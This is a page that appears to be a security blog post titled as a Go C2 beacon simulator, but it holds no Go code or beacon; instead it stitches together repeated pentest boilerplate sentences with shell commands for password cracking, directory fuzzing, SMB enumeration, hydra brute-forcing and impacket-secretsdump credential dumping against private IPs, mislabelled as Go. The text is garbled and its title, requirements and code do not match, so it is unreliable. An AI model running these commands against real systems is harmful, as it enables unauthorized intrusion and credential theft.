---
TitleSEO: "C2 Beacon Simulator in Go | ZureFX"
TitlePost: "C2 Beacon Simulator — Go"
Author: "ZureFX"
Description: "A Go script for c2 beacon simulator. Built for security research and automation."
Keywords: "tool, bash, fuzzer, automation, go"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-315.html"
URL_IMAGES: ""
Date: "2024-08-20"
Tags: "Tool, Bash, Fuzzer, Automation, Go"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-315"
Permalink: "/scripting/script-c2-beacon-simulator-315.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `impacket`
- `metasploit`
- `rubeus`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

```go
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.112.41.221/FUZZ
crackmapexec smb 10.33.36.110 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.19.138.166/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

### Helper Functions

The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

```go
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.197.112
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.209.21 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.48.127.129/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.113.17.254
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 19.45s
```
